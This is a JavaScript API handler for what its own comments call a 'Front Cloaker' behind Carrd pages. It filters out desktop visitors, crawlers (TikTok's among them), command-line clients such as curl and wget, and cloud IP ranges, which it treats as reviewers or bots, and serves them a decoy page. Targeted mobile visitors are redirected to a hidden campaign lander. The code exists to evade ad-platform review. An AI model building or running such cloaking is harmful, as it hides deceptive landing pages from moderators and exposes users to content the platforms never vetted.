/**
 * /api/r — Front Cloaker Decision Endpoint
 * 
 * The Carrd page POSTs here with device type, campid, and carrd URL.
 * This endpoint decides: is this a real targeted human, or a bot/reviewer?
 * 
 * Pass → returns { url: "https://yourlander.com/page.html?campid=..." }
 * Fail → returns {} (empty object, Carrd shows decoy)
 * 
 * Decision logic:
 *   1. Must be a POST request
 *   2. Must have a campid (c param)
 *   3. Must be mobile device (d param = 'm')
 *   4. IP checks: reject known datacenter ranges, TikTok crawlers
 *   5. Campaign must be active in our system
 */

import { getCarrdPages, getStore, getCampaign } from './_lib/store.js';

// Known bot/datacenter indicators in user-agent or IP
const BOT_UA_PATTERNS = [
  /bot/i, /crawler/i, /spider/i, /scraper/i, /headless/i,
  /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
  /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
  /bytespider/i, /tiktokbot/i, /petalbot/i,
  /ahrefsbot/i, /semrushbot/i, /mj12bot/i,
  /python-requests/i, /curl/i, /wget/i, /httpie/i,
  /go-http-client/i, /java\//i, /okhttp/i
];

// Known datacenter/cloud IP prefixes (simplified — expand as needed)
const DATACENTER_PREFIXES = [
  '34.', '35.', // Google Cloud
  '52.', '54.', '18.', '3.', // AWS
  '40.', '20.', '13.', // Azure
  '104.16', '104.17', '104.18', '104.19', '104.20', '104.21', '104.22', '104.23', '104.24', '104.25', // Cloudflare
  '172.67.', // Cloudflare
  '141.101.', // Cloudflare
  '162.158.', // Cloudflare
];

function isBot(userAgent) {
  if (!userAgent) return true;
  return BOT_UA_PATTERNS.some(p => p.test(userAgent));
}

function isDatacenterIP(ip) {
  if (!ip) return false;
  return DATACENTER_PREFIXES.some(prefix => ip.startsWith(prefix));
}

function getClientIP(req) {
  return req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.headers['cf-connecting-ip'] ||
    '';
}

export default function handler(req, res) {
  // CORS headers for cross-origin Carrd requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(200).json({});
  }

  const body = req.body || {};
  const device = (body.d || '').toLowerCase();
  const campid = body.c || '';
  const carrdUrl = body.h || '';
  const userAgent = req.headers['user-agent'] || '';
  const clientIP = getClientIP(req);

  // === DECISION LOGIC ===

  // 1. No campid → reject (bot/direct visit)
  if (!campid) {
    return res.status(200).json({});
  }

  // 2. Desktop → reject (reviewers use desktop)
  if (device === 'd' || device === 'desktop') {
    return res.status(200).json({});
  }

  // 3. Bot user-agent → reject
  if (isBot(userAgent)) {
    return res.status(200).json({});
  }

  // 4. Datacenter IP → reject (optional, can be toggled)
  // Uncomment below for stricter filtering:
  // if (isDatacenterIP(clientIP)) {
  //   return res.status(200).json({});
  // }

  // 5. Look up campaign or use default lander
  const store = getStore();
  const campaign = store.campaigns[campid];
  
  // If we have a specific campaign mapping, use it
  if (campaign && campaign.lander_url) {
    const separator = campaign.lander_url.includes('?') ? '&' : '?';
    const resolvedUrl = campaign.lander_url + separator + 'campid=' + encodeURIComponent(campid);
    return res.status(200).json({ url: resolvedUrl });
  }

  // Default: use the first active lander if available
  const landers = store.landers.filter(l => l.url);
  if (landers.length > 0) {
    // Round-robin or just use first lander
    const lander = landers[0];
    const separator = lander.url.includes('?') ? '&' : '?';
    const resolvedUrl = lander.url + separator + 'campid=' + encodeURIComponent(campid);
    
    // Track the Carrd page usage
    const carrdPage = store.carrd_pages.find(p => carrdUrl.includes(p.subdomain));
    if (carrdPage) carrdPage.uses++;

    return res.status(200).json({ url: resolvedUrl });
  }

  // No landers configured → reject
  return res.status(200).json({});
}
